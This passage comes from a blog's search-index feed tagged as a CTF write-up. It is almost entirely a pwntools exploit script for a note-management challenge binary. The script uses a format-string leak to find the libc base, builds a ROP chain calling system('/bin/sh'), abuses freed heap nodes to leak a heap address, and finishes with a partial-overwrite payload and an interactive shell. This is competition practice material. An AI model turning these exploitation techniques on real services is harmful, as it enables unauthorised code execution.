punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">leak_result</span><span class="token punctuation">(</span>until<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>until<span class="token punctuation">)</span>    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>    result<span class="token operator">=</span>u64<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak_result  content address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">send_name</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">new_node</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input note:\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_node</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" want:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_formate_result</span><span class="token punctuation">(</span>until<span class="token operator">=</span><span class="token string">"0x"</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>info<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>    info<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>length<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> info<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak info (may set a and b to get real info) : "</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>    <span class="token keyword">return</span> info<span class="token keyword">def</span> <span class="token function">get_int</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    content<span class="token operator">=</span><span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>    out<span class="token operator">=</span><span class="token punctuation">[</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"content to int end is : "</span><span class="token punctuation">,</span>out<span class="token punctuation">)</span>    <span class="token keyword">return</span> contentsend_name<span class="token punctuation">(</span><span class="token string">"%p-%p"</span><span class="token punctuation">)</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>info<span class="token operator">=</span>get_formate_result<span class="token punctuation">(</span><span class="token punctuation">)</span>info<span class="token operator">=</span>get_int<span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x3c6780</span>pop_rdi_ret<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0000000000021112</span>payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input note:\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>new_node<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>delete_node<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete_node<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show_node<span class="token punctuation">(</span><span class="token punctuation">)</span>heap_addr<span class="token operator">=</span>leak_result<span class="token punctuation">(</span><span class="token string">"index 1:"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x20</span><span class="token comment" spellcheck="true"># gift("a"+"\n")</span><span class="token comment" spellcheck="true">#debug_1([0x00000000000012C2,0x0000000000011B8])</span>gift<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xa9"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
